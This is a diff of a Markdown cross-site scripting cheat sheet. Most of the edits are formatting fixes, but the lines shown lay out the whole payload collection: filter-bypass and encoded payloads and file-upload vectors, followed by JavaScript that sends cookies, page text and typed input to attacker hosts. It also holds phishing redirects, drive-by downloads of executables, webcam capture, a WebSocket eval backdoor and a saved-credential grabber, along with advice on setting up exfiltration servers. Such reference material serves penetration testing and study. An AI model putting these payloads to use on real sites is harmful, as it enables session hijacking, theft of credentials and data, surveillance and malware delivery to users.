@@ -1,133 +1,183 @@
-Cross Site Scripting {XSS}
+Cross Site Scripting (XSS)
 ==========================
 
 ## Overview
 
-Cross Site Scripting or XXS vulnerabilities arise when user controlled data is injected into the DOM in such a way that it is interpreted as JavaScript by the parser resulting in its execution when rendred by the browser. 
+Cross Site Scripting or XXS vulnerabilities arise when user controlled data is injected into the DOM in such a way that it is interpreted as JavaScript by the parser resulting in its execution when rendered by the browser. 
 
 ## Identification Payloads
 
 ### Polyglots
 
-```
+```javascript
 javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
 ```
 
 
-```
+```javascript
 jaVasCript:/*-/*`/*\`/*'/*"/*%0D%0A%0d%0a*/(/* */oNcliCk=alert() )//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3ciframe/<iframe/oNloAd=alert()//>\x3e
 ```
 
 ### Basic Payloads
 
-`<script SRC=http://attacker.domain.com/payload.js></script>`
+```js
+<script SRC=http://attacker.domain.com/payload.js></script>
+```
 
-`<img SRC="javascript:alert('XSS');">`
+```js
+<img SRC="javascript:alert('XSS');">
+```
 
-`<iframe src="javascript:alert('xss')">`
+```js
+<iframe src="javascript:alert('xss')">
+```
 
-`<body oninput=javascript:alert(1)><input autofocus>`
+```js
+<body oninput=javascript:alert(1)><input autofocus>
+```
 
 ### Filter Bypass Payloads
 
 #### Script Tag Filtering
 
-`<SCRiP/**/t><ScRIpT>alert(1)<ScRiP/**/t></ScRip/**/T>`
+```js
+<SCRiP/**/t><ScRIpT>alert(1)<ScRiP/**/t></ScRip/**/T>
+```
 
-`<scr<script>ipt>alert(1)</scr<script>ipt>`
+```js
+<scr<script>ipt>alert(1)</scr<script>ipt>
+```
 
 #### Recursive Script Tag Stripping
 
-`<SCR<SCRIPTIPT>alert(1)</SCRIPT>`
+```js
+<SCR<SCRIPTIPT>alert(1)</SCRIPT>
+```
 
-`<SCR<SCR<SCRIPTIPT>IPT>alert(1)<</SCRIPT>/SCRIPT>`
+```js
+<SCR<SCR<SCRIPTIPT>IPT>alert(1)<</SCRIPT>/SCRIPT>
+```
 
 #### Script Content Filtering
 
-`<SCRIPT>window.location=atob(base64StringOfAttackSVR)</SCRIPT>`
+```js
+<SCRIPT>window.location=atob(base64StringOfAttackSVR)</SCRIPT>
+```
 
 #### Case Filtering
 
-`<IMG SRC=JaVaScRiPt:alert('XSS')>`
+```js
+<IMG SRC=JaVaScRiPt:alert('XSS')>
+```
 
 #### Edgecase Filtering
 
-`<<script<sscript+SRC="http://attacker.domain/alert.js"></script>`
+```js
+<<script<sscript+SRC="http://attacker.domain/alert.js"></script>
+```
 
 #### No Quotes && Semicolon
 
-`<IMG SRC=javascript:alert('XSS')>`
+```js
+<IMG SRC=javascript:alert('XSS')>
+```
 
 #### HTML Entities
 
-`<IMG SRC=javascript:alert(&quot;XSS&quot;)>`
+```js
+<IMG SRC=javascript:alert(&quot;XSS&quot;)>
+```
 
 #### Grave Accent Obfuscation
 
 + Hide double and single quotes from filter with grave accent wrapping
-```
+
+```javascript
 <IMG SRC=`javascript:alert("Hello, 'XSS'")`>
 ```
 
 #### Malformed Link Tags `<a>`
 
-```
+```javascript
 \<a onmouseover="alert(document.cookie)"\>attacker.domain.com/payload.js\</a\>
 ```
 
 ###### Chrome Edgecase
 
-```
+```javascript
 \<a onmouseover=alert(document.cookie)\>xxs link\</a\>
 ```
 
 #### Malformed `<img>` tags
 
-`<IMG """><SCRIPT>alert("XSS")</SCRIPT>"\>`
+```js
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>"\>
+```
 
 
 ### DOM Event Based Payloads
 
 #### Onload
 
-`<img onLoad="javascript:alert(1)">`
+```js
+<img onLoad="javascript:alert(1)">
+```
 
-`<iframe onLoad iframe onLoad="javascript:javascript:alert(1)"></iframe onLoad>`
+```js
+<iframe onLoad iframe onLoad="javascript:javascript:alert(1)"></iframe onLoad>
+```
 
-`<svg onLoad svg onLoad="javascript:javascript:alert(1)"></svg onLoad>`
+```js
+<svg onLoad svg onLoad="javascript:javascript:alert(1)"></svg onLoad>
+```
 
 #### Onerror
 
-`<img src=1 href=1 onerror="javascript:alert(1)"></img>`
+```js
+<img src=1 href=1 onerror="javascript:alert(1)"></img>
+```
 
-`<body src=1 href=1 onerror="javascript:alert(1)"></body>`
+```js
+<body src=1 href=1 onerror="javascript:alert(1)"></body>
+```
 
-`<script src=1 href=1 onerror="javascript:alert(1)"></script>`
+```js
+<script src=1 href=1 onerror="javascript:alert(1)"></script>
+```
 
 #### Onblur
 
-`<body onblur body onblur="javascript:javascript:alert(1)"></body onblur>`
+```js
+<body onblur body onblur="javascript:javascript:alert(1)"></body onblur>
+```
 
-`<input onblur=javascript:alert(1) autofocus><input autofocus>`
+```js
+<input onblur=javascript:alert(1) autofocus><input autofocus>
+```
 
 #### OnKeyDown
 
-`<body onkeydown body onkeydown="javascript:javascript:alert(1)"></body onkeydown>`
+
+```js
+<body onkeydown body onkeydown="javascript:javascript:alert(1)"></body onkeydown>
+```
 
 #### Onfocus
 
-`<body onfocus body onfocus="javascript:javascript:alert(1)"></body onfocus>`
+```js
+<body onfocus body onfocus="javascript:javascript:alert(1)"></body onfocus>
+```
 
 ### Encoded Payloads
 
 
-#### JS alert encode
++ alert encode
 
 ```
 <img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
 ```
 
-#### HTML Decimal Character References
++ HTML Decimal Character References
 
 ```
 <IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
@@ -137,7 +187,7 @@ jaVasCript:/*-/*`/*\`/*'/*"/*%0D%0A%0d%0a*/(/* */oNcliCk=alert() )//</stYle/</ti
 <IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
 ```
 
-#### HTML Hexadecimal Character References
++ HTML Hexadecimal Character References
 
 ```
 <IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
@@ -147,25 +197,28 @@ jaVasCript:/*-/*`/*\`/*'/*"/*%0D%0A%0d%0a*/(/* */oNcliCk=alert() )//</stYle/</ti
 
 + JSONP callbacks can be weaponised in certain circumstances to get XSS
 + JSONP based XSS vectors also have a high chance of negating CSP protections making them an exceptionally useful vulnerability
-+ Note: the following payloads are designed to be injected into any part of a web application which uses a JSONP endpoint, they can  
- also be injected into the callback of a legitimate JSONP query
++ *Note: the following payloads are designed to be injected into any part of a web application which uses a JSONP endpoint, they can also be injected into the callback of a legitimate JSONP query*
 	+ For example: `domain.com/page?query=PAYLOAD`
 
 #### Basic JSONP Payloads
 
-`<script src="https://current.domain.com/jsonp_endpoint.jsonp?callback=alert(1);"></script>`
+```js
+<script src="https://current.domain.com/jsonp_endpoint.jsonp?callback=alert(1);"></script>
+```
 
 ### Image/File Upload Based Payloads
 
-#### File Name
+#### File Name Injection
 
-```
++ Upload a file like
+
+```javascript
 ""><img src=x onerror=alert(1)>.gif
 ```
 
 #### SVG 
 
-```
+```javascript
 <?xml version="1.0" standalone="no"?>
 <svg width="1056" height="816" xmlns="http://www.w3.org/2000/svg" onload="alert(1)" id="svgvm7">
 <g transform="translate(5,5)" style="font-family: sans-serif;"><g><g transform="translate(0, 0)">
@@ -173,7 +226,7 @@ jaVasCript:/*-/*`/*\`/*'/*"/*%0D%0A%0d%0a*/(/* */oNcliCk=alert() )//</stYle/</ti
 
 #### CSV
 
-```
+```javascript
 </Textarea/</Noscript/</Pre/</Xmp><Svg /Onload=confirm(document.domain)>”
 ```
 
@@ -181,13 +234,13 @@ jaVasCript:/*-/*`/*\`/*'/*"/*%0D%0A%0d%0a*/(/* */oNcliCk=alert() )//</stYle/</ti
 
 *These can be embeded with exiftool and hence an example command for doing so is included.*
 
-```
+```javascript
 “><img src=1 onerror=alert(alert(1))>’ payload_file.jpeg
 ```
 
 **Usage**
 
-`$ exiftool -Artist='PAYLOAD'`
+`exiftool -Artist='PAYLOAD'`
 
 #### GIF
 
@@ -199,14 +252,16 @@ jaVasCript:/*-/*`/*\`/*'/*"/*%0D%0A%0d%0a*/(/* */oNcliCk=alert() )//</stYle/</ti
 JS code for embedding in exploit payloads.
 
 ### Phishing Redirect
-```
+
+```javascript
 window.location='https://attackerphishingsite.com'
 ```
-```
+
+```javascript
 window['location']='https://attackerphishingsite.com'
 ```
 
-```
+```javascript
 document.location='https://attackerphishingsite.com'
 ```
 
@@ -214,38 +269,38 @@ document.location='https://attackerphishingsite.com'
 
 *For use with an [exfiltration/attack server](#exfiltration-servers)*
 
-```
+```javascript
 fetch('attack.domain.com?cookie=${encodeURIComponent(document.cookie)}')
 ```
 
-```
+```javascript
 window.location = "http://attack.svr?stolen_token=" + document.cookie;
 ```
 
-```
+```javascript
 window['location'] = "http://attack.svr?stolen_token=" + document['cookie'];
 ```
 
-```
+```javascript
 document.location = "http://attack.svr?stolen_token=" + document.cookie";
 ```
 
-```
+```javascript
 document['location'] = "http://attack.svr?stolen_token=" + document['cookie'];
 ```
 
-```
+```javascript
 let req = new XMLHttpRequest();res.open('GET', 'http://attack.svr?stolen_token=' + document.cookie);req.send();
 ```
 
-```
+```javascript
 document.write(<img src="http://attack.svr?cookie=" + document.cookie>);
 ```
 
 ### Grab Protected Pages
 
 
-```
+```javascript
 fetch('/protected_page')
 	.then(page => page.text())
 	.then(text => 
@@ -263,19 +318,19 @@ fetch('/protected_page')
 
 #### Page Area {div, span, etc}
 
-```
+```javascript
 fetch('attacker.domain.com?data=' + encodeURIComponent(document.querySelector('.hmtlClassElmentToSteal').textContent))
 ```
 
 #### Input Field/Text Area
 
-```
+```javascript
 fetch('attacker.domain.com?data=' + encodeURIComponent(document.querySelector('.hmtlClassElmentToSteal').textValue))
 ```
 
 ### Grab Screenshots
 
-```
+```javascript
 <script src=https://html2canvas.hertzen.com/dist/html2canvas.min.js>
 html2canvas(document.body)
 	.then(canvas => 
@@ -294,7 +349,7 @@ html2canvas(document.body)
 
 #### Macro Document
 
-```
+```javascript
 frame = document.createElement('iframe')
 frame.src = 'attack.domain.com/payloadDocument.docx'
 document.body.appendChild(frame)
@@ -302,7 +357,7 @@ document.body.appendChild(frame)
 
 #### Executable File
 
-```
+```javascript
 <a href=/executable.exe download=executable.exe onclick="if(window.el){return;}el=this;
 	fetch('attack.domain.com/payload.exe')
 		.then(resp => resp.blob())
@@ -321,7 +376,7 @@ document.body.appendChild(frame)
 
 *For use with an [exfiltration/attack server](#exfiltration-servers)*
 
-```
+```js
 vid_element = document.createElement('video')
 navigator.mediaDevices.getUserMedia({video:true})
 	.then(stream => {
@@ -346,7 +401,7 @@ navigator.mediaDevices.getUserMedia({video:true})
 
 *For use with an [exfiltration/attack server](#exfiltration-servers)*
 
-```
+```js
 sock = new WebSocket('wss://attack.domain.com')
 sock.onmessage = event => eval(e.data)
 ```
@@ -355,7 +410,7 @@ sock.onmessage = event => eval(e.data)
 
 *For use with an [exfiltration/attack server](#exfiltration-servers)*
 
-```
+```js
 document.addEventListener('change', element => {
 		if(!element.target.matches('input, textarea')) return
 		fetch('attack.domain.com', {
@@ -368,7 +423,7 @@ document.addEventListener('change', element => {
 
 ### Steal Saved Browser Credentials
 
-```
+```js
 form = document.createElement('form')
 usr_name = document.createElement('input')
 usr_name.setAttribute('type', 'text')
@@ -388,7 +443,7 @@ document.addEventlistener('click', () =>
 
 ## Exfiltration Servers
 
-+ This section aims to document several approaches to setting up an attack server for XSS exfiltration 
+This section aims to document several approaches to setting up an attack server for XSS exfiltration 
 
 ### [AWS EC2 Instance](https://us-east-2.console.aws.amazon.com/ec2/)
 
@@ -402,7 +457,7 @@ document.addEventlistener('click', () =>
 + Public IPv4 address 
 + Possible to configure a IPv6 address also
 + Fast to connect, little machine configuration required
-	+ Can all be done through managment console
+	+ Can all be done through management console
 
 **Cons**
 
@@ -432,7 +487,7 @@ document.addEventlistener('click', () =>
 
 **Cons**
 
-+ Not as flexiable as a server
++ Not as flexible as a server
 
 **Usage**
 
@@ -502,6 +557,7 @@ parts of web applications interpret as delimiters or other characters
 the `+` character in many cases will be 'transformed' into a `space` character consequently breaking the JS syntax and your payload
 
 ##### Common 'Bad/interpreted Characters'
+
 ```
 | Interpreted Character | URL Encoding (Patch) |
 |-----------------------|----------------------|
@@ -551,9 +607,7 @@ the `+` character in many cases will be 'transformed' into a `space` character c
 + Base 64 encode long strings and then use the JS `atob(string)` in the payload body to decode the string back to plain text 
 + Add or remove `;//` after url strings 
 
-## Finding && Exploiting XSS
-
-### Identification Checklist
+## Finding and Exploiting XSS
 
 #### DOM Based XSS
 
